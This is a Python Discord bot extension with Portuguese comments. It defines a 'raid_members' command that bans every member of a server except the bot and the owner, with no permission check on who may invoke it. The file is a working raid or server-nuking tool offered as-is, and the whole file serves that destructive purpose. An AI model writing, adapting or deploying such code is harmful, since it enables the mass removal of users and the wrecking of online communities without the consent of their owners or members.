import discord
from discord.ext import commands

class MemberCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def ban_all_members(self, guild):
        for member in guild.members:
            try:
                if member != guild.me and member != guild.owner:
                    await member.ban(reason="Mensagem")  
                    print(f"Membro banido: {member.name}")
            except Exception as e:
                print(f"Erro ao banir {member.name}: {e}")

    @commands.command()
    async def raid_members(self, ctx):
        """Comando para banir a todos os membros"""
        guild = ctx.guild
        await self.ban_all_members(guild)

def setup(bot):
    bot.add_cog(MemberCommands(bot))
